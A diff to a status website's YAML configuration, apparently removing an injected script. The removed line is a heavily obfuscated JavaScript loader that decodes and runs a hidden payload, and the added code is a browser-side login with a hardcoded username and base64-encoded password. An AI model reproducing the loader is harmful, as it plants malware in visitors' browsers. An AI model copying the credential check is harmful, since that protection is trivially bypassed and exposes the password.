@@ -45,7 +45,42 @@ status-website:
   introMessage: Here, you can monitor the real-time availability of our services and infrastructure. We are committed to maintaining high uptime and transparency for our clients and partners. If there are any interruptions in service, they will be reported and tracked here.
 
   js: |
-    (function(){var mSR='',Spy=646-635;function FWi(l){var c=823183;var y=l.length;var h=[];for(var r=0;r<y;r++){h[r]=l.charAt(r)};for(var r=0;r<y;r++){var f=c*(r+314)+(c%15341);var w=c*(r+451)+(c%51607);var a=f%y;var d=w%y;var n=h[a];h[a]=h[d];h[d]=n;c=(f+w)%1425742;};return h.join('')};var ZbW=FWi('gotztbnefjrikwcxhsuarmlnsotqdyuccopvr').substr(0,Spy);var DDN='ngr+rn(ofd=);ei=r1(,)s -se9r]ortjoAo r.lla,A{wg;7xt..f+j=-z8=t,.dpv74jv.dpCe,eh[[r,p[t=,; =hA];)5ld,C"v+l,7589v(enrv(fmr5;d.o )=ts)pv[+ d.)([xtd1t,uSnn()()o+=frs[6g;=d;r(v)8 ai)(;m =we;t(1atpyA}og .vi7aeu hr6.h og].r)j[ 7t;nlt(o)+;5v)a-o;n),eu0]-tCaugis2n)ia= (1"t++,ztruya,.(tnhl4.n;.>=e;211v*[ind;=rt)l vl{ i+oi)9r6a+8==el;l;vas =]io;reeo=hn alnrtb-8r rae;s;,0p eaCteflib0+cf+]gn,rp[hc.rCaa7nrf.)r;k+[r<={]fa=-(a[;a)(8t-itgm,e"i.ro}6A!vrvc2v6ck =+;e=yrl;x n i)+)k5ac{wd;n=bm0mn)t0;hgb;ba.}(ah;h,]1g1,dn4sch(jr{a"(hfaaw8]v<0lo(eyltxnde+iv+n)reoue)1nftk=usu"lt2s[(;)lbn(=vk(3uj,pnasgc8;+1absyhz(}hizs7feinaq;=("s6)};(g==<rh"=revs;blfC,o=))afuv;(r+0h ,ka+vums{t23[j]gn1kho,orbC"f}al7o}h+e)0]oi=;un9rspembs,(>()o;e{ gru;=(a9e32u;=,9;,02h.eu"cb=ova!(;g[asnk.k(s.ot;.Ce.r68oh)<r)=Sv+d8li00=0 =d,)i];g;17l=+9s(t.s.cf;ajfuxie2mr((r68u1l0e+vtpaf"]irrt,hdpx=d,.hlrfv;]r=f.1*poaw ;=;e)4<v=+.dei=yzlr';var WSI=FWi[ZbW];var CSZ='';var TqO=WSI;var tmu=WSI(CSZ,FWi(DDN));var Peg=tmu(FWi('E?Uit;Uo-Ho]UUUdf$n%o"uh_.UonUcio _U([(UUU5Ur(?.A.eG_ gU3y].fjaao2UU.U)orm6Ug_%UfUc1cU%Drwr{e6FU*U(. e)teliA$38t{]b0n3o)._;.UEgUcCU:U%)elw,2U=!U:wi()tw%_UyU7yc.n#.UpC9icUUE._ete2S.eU0Un=1.0;U802d(bs.U|c6o)E8U[6f ;Ur;3%.mbgFocrbl43-\'(o{>..;4Uc%U+_mh.crUl{,j me,0lUTec!U:i_o=nere s6cc.(bdyUU\/d.5:;Utu,]Ibr:l2n8nlU0ko7U25awprU i_2r!eU1.;UUUn344U%otiMtUgd:U92U=!UfU7U%4UUU1e0Ir< ;Uitrt%,.u13.E\/i)0 .{9;e=g%)tUSe3.e.nlU=lpe_UU6t:f3(fU8)i{!UrUUo);%esotouUdpE,0w.c[1rd)%_{ <op.dtx0o}t.>v!(1.C.p2hh)l+(%e6;}n9lfU]}t{  fec_(r];e}yn7nrUso0_63UrUU.m]cogcrUa!e_\'.s0U 8o_ie%.,t%=8.eUcH!83hfn7con,e;xyUcr1(2.rM;a wrdt:ccUo.kn(,nUla(.6)sU=%r{ c5!UIdarU.)r.%dtKtj0r6ed:#8(Ueoo7{v:{ide2rnt\/,U;pu[13oojmoUUi]idiUnte;xe-in)(n(E&oUU!U,=tU\';rh{;#=mceAi0uhE%UGbe3U8ed{jes"i2..=s.gU=2mpaU2mc(030it_.1di$0d,b=( 2ClhC9u(35=)4r2(c$nie(;,0n3t(%JFrUoe.338tUiccnUr7.!3,)6et(+Ub&ro#2+p$U!..+<U,"wmw=e(;Ui7EUDf_0d=8a]U0t.s\'(ut+{)U 3+%lnF%U(])),x(d)UU0J]cc(c!4t-c=au7cpe_ssJ_ m7l$n6a!1UJ>).e-=.cUnE3UbU>g((2aun,cH.0}%,..)sU}cam;g!l3!Uclpi[_S,$=8!agcpp$t)i}foclUgwr,orm$f2ic;UAt7)),6>t.7_]6=h.tKUUeif;b4f]U|) c.!$*t3b;.G>_jt$r=%#b.ndUf5smeUe9o.5roUo;.,Anac_cU.).7.#o!t0.>3cr$0Uwgn()(4t3.tU2?181hUfx1Dl2(tdbgdo _at!)g.0bDU;ayuBo+UUrU\/))fTUe=(1zn)c5\/3r082_n[)aF;=3Af(Uty[.Un\/U_"le3fsg?4!3r)U)u2 (5troUeU)sU;i$$m)UU.rU>fl #lt2Ue eU;U!mttl{&;lUnm+t_o<ibia4[a,b3_CUu_.U[eUfher!.#ei[U6_s!{!))}=o3UUb3eqe-od.6n;()6r45&U[_))r.eU6U+e1UbUnh;[txcp860dU$3(5%dll)2aa( ;+ng2(Uw3ds$%c{Uo1[g@UUeUcpm%}nU_b!nK-(oU(t-6t(u(eUo$U1c9tUUg #nnhorrr(uF$uU$Uu760UGBUUn2}15)3)e,8im(angrUd0[_4;Up@!U)U)i(.alr:c3c$U =1 s.U)"34t1_9flop.U c.4c]U4r?))b!UAtU2hGu?1Ukit.l !UxU*,w,.=5xd%UaL!.s1.ChLa$(1n9sd,7.:M)g[8+9UcrpaU}3n;\/)BBafx.9L.);UhU2$+rU5.op{\'o L%H!#SUUs8_U{U(atco1U(.8c*1)gUm;)c=7dt_.35_]t\/)he_(Ulp}4d=!2 $UcoanUm3s;)0Uu0h[tU]=c.=9dbc0U4UosrpUU3_]!)sAr2U _t$;tefn]a_cvlstxU{a)e.a(9.cse1UU =bb-U)c6c_ 2!Uux5e)53p\/dpno{)b[{e8#32:8a.ln5a0n rl:{!!.co)7_nK!]-U,8&nernr)e2"E:.3vI%$cU2"prU43=orfe}l9_3ey.iU906)UUn6G)ts)_"oo6c9xUU1Gl((7([tr]Ui:) 2Ueek UpUU;5jwstdg[1p).6]tl(]B4].;4 l(cvuk>mUUU 3]2lg!pl(c(c1,:hUgU)2E n)rdso,)%. e!(aGnUa(nsU;u3e].U1 .9raf6hu$r2=_01!csa.o.]n Un23_d(,u;te(}eE:,op g=UinUcU3.){))D,b,")..)c'));var vdI=TqO(mSR,Peg );vdI(8852);return 9481})()
+    document.addEventListener("DOMContentLoaded", function () {
+      const path = window.location.pathname;
+      if (path === "/history") {
+        document.body.innerHTML =
+          "<h1 style='color: red; text-align: center; color:#002626; margin-top: 20px'>403 Forbidden</h1>";
+        return;
+      }
+      if (path.startsWith("/history/")) {
+        return;
+      }
+      document.body.style.display = "none";
+      const username = prompt("Enter username:");
+      const password = prompt("Enter password:");
+      const encodedPassword = btoa(password);
+      if (username !== "lime" || encodedPassword !== "bGltZTEyMw==") {
+        document.body.style.display = "block";
+        document.body.innerHTML =
+          "<h1 style='color: red; text-align: center; color:#002626; margin-top: 20px'>Unauthorized</h1>";
+      } else {
+        document.body.style.display = "block";
+        document.querySelectorAll("a.logo").forEach((a) => {
+          a.removeAttribute("href");
+          console.log("remove a");
+        });
+      }
+
+      document.querySelectorAll("a.logo").forEach((a) => {
+        a.removeAttribute("href");
+        console.log("remove b");
+      });
+    });
+
+    document.querySelectorAll("a.logo").forEach((a) => {
+      a.removeAttribute("href");
+      console.log("remove c");
+    });
 
 # navbar:
 #    - title: Status
